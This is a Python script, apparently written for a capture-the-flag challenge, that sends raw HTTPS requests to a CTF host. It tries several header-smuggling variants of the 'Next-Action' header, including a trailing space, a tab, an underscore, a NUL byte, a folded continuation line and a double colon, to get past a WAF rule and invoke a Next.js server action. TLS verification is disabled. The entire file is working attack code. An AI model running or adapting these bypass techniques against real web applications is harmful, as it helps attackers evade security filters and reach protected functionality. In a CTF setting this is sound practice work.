#!/usr/bin/env python3
"""
Try various Next-Action header smuggling tricks at the raw socket level
to bypass the WAF rule that matches ^Next-Action$.
"""
import socket, ssl, sys

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"


def send_raw(payload, label):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((HOST, PORT), timeout=15)
    s = ctx.wrap_socket(s, server_hostname=HOST)
    s.sendall(payload)
    chunks = []
    try:
        while True:
            data = s.recv(8192)
            if not data:
                break
            chunks.append(data)
            if len(b"".join(chunks)) > 32768:
                break
    except (TimeoutError, socket.timeout):
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass
    full = b"".join(chunks)
    head, _, body = full.partition(b"\r\n\r\n")
    print(f"\n=== {label} ===")
    print(head[:400].decode("utf-8", "replace"))
    print("--- body[:400] ---")
    print(body[:400].decode("utf-8", "replace"))
    return full


# Standard request body (multipart with action id field, just so server has something)
body = b"[]"

# Variants of the header name
variants = [
    # Trailing space in header name (lighttpd rejected earlier with 400)
    f"Next-Action : {ACTION_ID}",
    # Tab between name and colon (some parsers strip)
    f"Next-Action\t: {ACTION_ID}",
    # underscore variant - Node.js sometimes maps Next_Action -> Next-Action when Express x-* mapping (unlikely but try)
    f"Next_Action: {ACTION_ID}",
    # NUL between (illegal but maybe WAF strips)
    "Next-Action\x00: " + ACTION_ID,
    # Continuation header (folded line)
    "X-Filler: a\r\n Next-Action: " + ACTION_ID,
    # With space at front of value
    f"Next-Action:  {ACTION_ID}",
    # Two newlines after Next-Action: as part of value (might be stripped by WAF)
    f"Next-Action:{ACTION_ID}",
    # double colon
    f"Next-Action:: {ACTION_ID}",
]

for v in variants:
    req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: text/plain;charset=UTF-8\r\n"
        f"Accept: text/x-component\r\n"
        f"{v}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    try:
        send_raw(req, label=repr(v))
    except Exception as e:
        print(f"\n=== {v!r} -> ERR {e} ===")
